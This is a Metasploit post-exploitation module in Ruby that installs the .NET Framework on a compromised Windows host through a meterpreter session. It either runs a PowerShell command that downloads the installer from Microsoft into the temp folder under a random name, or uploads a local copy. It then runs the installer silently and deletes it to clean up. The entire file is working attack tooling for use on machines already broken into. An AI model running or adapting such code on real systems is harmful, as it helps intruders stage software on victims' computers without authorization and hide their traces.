##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Process

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Install dotNet for Windows',
      'Description'   => %q(
          This module Internet downloads or local upload dotNet for Windows.
      ),
      'License'       => MSF_LICENSE,
      'Author'        => ['AnonySec'],
      'Platform'      => [ 'win' ],
      'Arch'          => [ARCH_X86, ARCH_X64],
      'SessionTypes'  => [ 'meterpreter' ]
      ))

    register_options(
      [
        OptBool.new('UPLOAD', [true, 'Upload the dotnet install package locally', true]),
        OptBool.new('DOWNLOAD', [false, 'Download the Dotnet install package on the Internet', false]),
      ])
  end

  # $dotnet_name = Rex::Text.rand_text_alphanumeric(8)
  # $filetmp = session.sys.config.getenv('tmp') + "\\"

  # 静默安装dotNet
  def dotnet_install(dotnet_name,filetmp)

    session.sys.process.execute(filetmp + "#{dotnet_name}.exe /q /norestart /ChainingPackage FullX64Bootstrapper")
    dotnet_pid = session.sys.process["#{dotnet_name}.exe"]

    print_status ("DotNet is installing, PID: #{dotnet_pid}")

    # dotNet安装PID是否结束
    while (not (dotnet_pid.to_s).empty?)
      dotnet_pid = session.sys.process["#{dotnet_name}.exe"]
    end

    print_good("DotNet installed successfully !")

    # 删除dotNet安装包
    session.fs.file.rm(filetmp + "#{dotnet_name}.exe")
    print_status("DotNet install package has been removed")
  end

  def run

    dotnet_name = Rex::Text.rand_text_alphanumeric(8)
    filetmp = session.sys.config.getenv('tmp') + "\\"
    
    if datastore['download']

      # 检查PowerShell是否可用
      psh_path = "\\WindowsPowerShell\\v1.0\\powershell.exe"
      unless file? "%WINDIR%\\System32#{psh_path}"
        fail_with(Failure::NotVulnerable, "No powershell available, Please use upload.")
      end
      
      process = session.sys.process.execute("powershell.exe (new-object System.Net.WebClient).DownloadFile( 'https://download.microsoft.com/download/9/5/A/95A9616B-7A37-4AF6-BC36-D6EA96C8DAAE/dotNetFx40_Full_x86_x64.exe','#{filetmp}#{dotnet_name}.exe')")

      # 打开process进程PID
      # hprocess = session.sys.process.open(process.pid,PROCESS_ALL_ACCESS)
      dotnet_down_pid = process.pid
      # dotnet_down_pid = pid.to_s
      print_status ("DotNet is downloading, PID: #{dotnet_down_pid}")

      # PowerShell下载PID是否结束
      while (not (dotnet_down_pid.to_s).empty?)
        powershell_down = has_pid?(dotnet_down_pid)
        # print_status(powershell_down.to_s)
        unless powershell_down
          break
        end
      end
      
      dotnet_install(dotnet_name,filetmp)
      return
    end

    if datastore['upload']
      
      # 目录 data/post/scanner/dotNetFx40_Full_x86_x64.exe
      dotnet_localpath = ::File.join(Msf::Config.data_directory, 'post', 'scanner', 'dotNetFx40_Full_x86_x64.exe')
      dotnet_remotepath = filetmp + "#{dotnet_name}.exe"

      unless File.file?(dotnet_localpath)
        print_error ("DotNet install package don’t found: #{dotnet_localpath} !")
        return
      end

      print_status ("DotNet install package is uploading ...")
      session.fs.file.upload_file(dotnet_remotepath, dotnet_localpath)

      dotnet_install(dotnet_name,filetmp)
      return
    end

  end
end